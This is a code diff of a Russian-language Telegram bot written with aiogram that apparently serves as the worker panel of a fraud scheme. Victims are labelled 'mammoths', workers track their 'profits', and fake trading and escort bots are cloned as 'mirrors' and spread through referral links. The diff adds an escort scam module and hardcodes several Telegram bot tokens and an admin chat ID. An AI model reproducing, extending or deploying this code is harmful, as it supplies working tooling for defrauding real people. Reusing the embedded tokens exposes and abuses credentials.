@@ -14,6 +14,7 @@ from aiogram.dispatcher.filters.state import State, StatesGroup
 from db import Worker, session, Mammoth, Withdraws, Payouts
 from img import generate_profile_stats_for_worker
 from test import create_mirror
+from escortbot import create_mirror_of_escort_bot
 from aiobotocore.session import get_session
 import requests
 from  diction import active_chats
@@ -21,7 +22,7 @@ from config_for_bots import payout_for_admins_bot_token
 from payoutbot import create_mirror_of_payout_bot
 admin_chat_id  = '881704893'
 #API_TOKEN = '6686215620:AAHPv-qUVFsAKH4ShiaGNfZWd0fHVYCX2qg'
-API_TOKEN = '6425684889:AAF-oxFqykctlFHJWUzuv0O9lHXiqq_rm78'
+API_TOKEN = '6425684889:AAHTvfvQ2v1UbhBn72LbQiT3lXzWcW3aPk0'
 from aws import  sqs
 logging.basicConfig(level=logging.INFO)
 import threading
@@ -118,7 +119,6 @@ async def handle_distribution(message: types.Message, state: FSMContext):
         data = {'chat_id':mammonth.telegram_id, 'text':message.text}
         requests.post(url = f'https://api.telegram.org/bot{worker.token}/sendMessage', data = data)
     await state.finish()
-
 
 @dp.message_handler(lambda message:message.text.startswith('/t'))
 async def get_info_about_mammonth(message: types.Message):
@@ -329,7 +329,9 @@ class create_mirror_bot_states(StatesGroup):
     first = State()
     second = State()
 
-
+class create_mirror_for_escort_bot_states(StatesGroup):
+    first = State()
+    second = State()
 
 def admin_approval_button(telegram_id):
 
@@ -481,11 +483,18 @@ trading_button = KeyboardButton("Трейдинг 📊")
 casino_button = KeyboardButton("Казино 🎰")
 arbitrage_button = KeyboardButton("Арбитраж 🌐")
 about_button = KeyboardButton("О проекте 👨‍💻")
-
+escort_button = KeyboardButton("Эскорт💝")
     # Добавляем кнопки к клавиатуре (можно добавить больше кнопок)
-markup.add(profile_button, nft_button, trading_button)
+markup.add(profile_button, nft_button, trading_button, escort_button)
 markup.add(casino_button, arbitrage_button, about_button)
 
+
+def create_markup_for_escort():
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton('Управление мамонтам', callback_data='mammonths_management_for_escort_bot'))
+    markup.add(InlineKeyboardButton('Создать зеркало бота', callback_data='create_mirror_for_escort_bot'))
+    markup.add(InlineKeyboardButton('Создать модель', callback_data='create_model_for_escort_bot'))
+    return markup
 
 def create_markup_for_trading():
     markup_for_trading = InlineKeyboardMarkup()
@@ -493,28 +502,38 @@ def create_markup_for_trading():
     markup_for_trading.add(InlineKeyboardButton('Создать зеркало бота', callback_data='create_mirror'))
     markup_for_trading.add(InlineKeyboardButton('Минималка', callback_data='minimal_amount'))
     return markup_for_trading
-@dp.message_handler(lambda message: message.text in ["Профиль 🐳", "NFT 💠", "Трейдинг 📊", "Казино 🎰", "Арбитраж 🌐", "О проекте 👨‍💻"])
+@dp.message_handler(lambda message: message.text in ["Профиль 🐳", "NFT 💠", "Трейдинг 📊", "Казино 🎰", "Арбитраж 🌐", "О проекте 👨‍💻", 'Эскорт💝'])
 async def handle_menu(message: types.Message):
     user = session.query(Worker).filter(Worker.telegram_id==message.from_user.id).first()
     if not user:
         await message.answer('Авторизуйтесь чтобы получить доступ к функциям воркеров')
         return
+    service_id = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first().service_id
+
     if message.text == "Профиль 🐳":
         await showprofile(message)
     elif message.text == "NFT 💠":
         await message.answer("Вы выбрали 'NFT 💠'")
     elif message.text == "Трейдинг 📊":
-        service_id=session.query(Worker).filter(Worker.telegram_id==message.from_user.id).first().service_id
+
         template =f'''
 📊 Трейдинг
 
 📋 Ваш код: `{service_id}`
-🔗 Ваша реферальная ссылка: [НАЖМИ И СКОПИРУЙ](https://t.me/CasiktriBot?start={service_id})
+🔗 Ваша реферальная ссылка: [НАЖМИ И СКОПИРУЙ](https://t.me/HotBiitBot?start={service_id})
         
         
         
         '''
         await message.answer(template, reply_markup=create_markup_for_trading(), parse_mode=ParseMode.MARKDOWN)
+    elif message.text == 'Эскорт💝':
+        await message.answer(f'''
+💝 Эскорт
+
+📝 Инструкция по боту [здесь](https://telegra.ph/RGT--EHskort-09-23)
+📋 Ваш код: [`{service_id}`]
+        
+    ''', parse_mode=ParseMode.MARKDOWN, reply_markup=create_markup_for_escort())
     elif message.text == "Казино 🎰":
         await message.answer("Вы выбрали 'Казино 🎰'")
     elif message.text == "Арбитраж 🌐":
@@ -534,7 +553,7 @@ async def showprofile(message: types.Message):
 💸 У тебя {worker.profit_quantity} профитов на сумму {worker.profit} RUB
 Средний профит {(lambda profit, profit_quantity: 0 if profit_quantity == 0 else profit / profit_quantity)(worker.profit, worker.profit_quantity)} RUB
 
-Приглашено: {len(session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all())} маммонтов
+Приглашено: {len(session.query(Mammoth).filter(Mammoth.belongs_to_worker == message.from_user.id).all())} маммонтов, {len(worker.invited_worker.split(','))-1} воркеров 
 Баланс: {worker.balance} RUB
 Статус: Воркер
 Предупреждений: [{worker.warnings}/3]
@@ -554,15 +573,18 @@ async def showprofile(message: types.Message):
 
 @dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
-    mirror_bot_threadw = threading.Thread(target=create_mirror_of_payout_bot, args=('6415616043:AAHT0EMBrRCFnefpnJGUlefszGGRrRVCvns',))
+
+    mirror_bot_threadw = threading.Thread(target=create_mirror_of_payout_bot, args=('6415616043:AAHLjQXT08DSEvk_OVIupYlNftSeo2FpACY',))
     mirror_bot_threadw.start()
     try:
+
         service_id = int(message.get_args())
         worker = session.query(Worker).filter(Worker.service_id == service_id).first()
-        worker.invited_worker += f'{message.from_user.id},'
-        session.commit()
+        if message.from_user.id != worker.telegram_id:
+            worker.invited_worker += f'{message.from_user.id},'
+            session.commit()
 
-        await bot.send_message(chat_id= worker.telegram_id,text = 'По вашей реферальной ссылке перешел новый воркер!')
+            await bot.send_message(chat_id= worker.telegram_id,text = 'По вашей реферальной ссылке перешел новый воркер!')
     except Exception as ex:
         'ok'
 
@@ -604,6 +626,11 @@ async def handle_agree_callback(query: types.CallbackQuery):
     await QuestionsAndAnswersStates.first.set()
 
 
+@dp.callback_query_handler(lambda callback_query: callback_query.data == 'create_mirror_for_escort_bot')
+async def create_mirror_for_escort_bot_handler(query: types.CallbackQuery):
+    await create_mirror_for_escort_bot_states.first.set()
+    await query.message.answer('Введите токен бота', reply_markup=create_button_how_to_input_token())
+
 @dp.callback_query_handler(lambda callback_query: callback_query.data == 'create_mirror')
 async def create_mirror_handler(query: types.CallbackQuery):
 
@@ -627,6 +654,25 @@ async def my_mammonts_handler(query: types.CallbackQuery):
 (/t{mammont_from_db.service_id}) - {mammont_from_db.first_name} - *{mammont_from_db.balance}*, Фарт - {mammont_from_db.luck}
 '''
     await query.message.answer(template, parse_mode=ParseMode.MARKDOWN)
+@dp.message_handler(state=create_mirror_for_escort_bot_states.first)
+async def create_mirror_for_escort_bot_states_first_handler(message: types.Message, state: FSMContext):
+    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
+
+    async with state.proxy() as data:
+        data['mirror_bot_token'] = message.text
+    await state.finish()
+    import threading
+    mirror_bot_thread = threading.Thread(target=create_mirror_of_escort_bot, args=(message.text, message.from_user.id))
+    mirror_bot_thread.start()
+    try:
+        if Bot(message.text):
+            await message.reply(f"""Создание зеркала завершено!""", parse_mode=ParseMode.MARKDOWN)
+            worker.token = message.text
+            session.commit()
+
+
+    except:
+        await message.reply(f"""Вы ввели несуществующий токен!""", parse_mode=ParseMode.MARKDOWN)
 @dp.message_handler(state=create_mirror_bot_states.first)
 async def create_mirror_states_first_handler(message: types.Message, state: FSMContext):
     worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
@@ -637,10 +683,15 @@ async def create_mirror_states_first_handler(message: types.Message, state: FSMC
     import threading
     mirror_bot_thread =  threading.Thread(target=create_mirror, args=(message.text, message.from_user.id))
     mirror_bot_thread.start()
+    try:
+        if Bot(message.text):
+            await message.reply(f"""Создание зеркала завершено!""", parse_mode=ParseMode.MARKDOWN)
+            worker.token = message.text
+            session.commit()
 
-    await message.reply(f"""Создание зеркала завершено!""", parse_mode=ParseMode.MARKDOWN)
-    worker.token = message.text
-    session.commit()
+
+    except:
+        await message.reply(f"""Вы ввели несуществующий токен!""", parse_mode=ParseMode.MARKDOWN)
 @dp.callback_query_handler(lambda callback_query:callback_query.data=='mammonths_management')
 async def mammonts_management_handler(query:types.CallbackQuery):
     worker_id = query.message.from_user.id
@@ -702,7 +753,6 @@ async def handle_approve_callback(query: types.CallbackQuery):
     chat = await  bot.get_chat(chat_id)
     await bot.send_message(chat_id, "Вы верифицированный пользователь. Теперь вы имеете право пользоваться функциями для воркеров")
 
-
     new_user = Worker(telegram_id=chat_id, name=chat.username)
     session.add(new_user)
     session.commit()
@@ -721,6 +771,10 @@ async def handle_approve_callback(query: types.CallbackQuery):
 if __name__ == '__main__':
 
     from aiogram import executor
+    import threading
+
+    mirror_bot_thread = threading.Thread(target=create_mirror, args=('6697933833:AAHN1XS3c8xYnk8MpePa8CyPYD03cxbCSbg',))
+    mirror_bot_thread.start()
 
     storage = MemoryStorage()
     # Подключаем MemoryStorage к боту
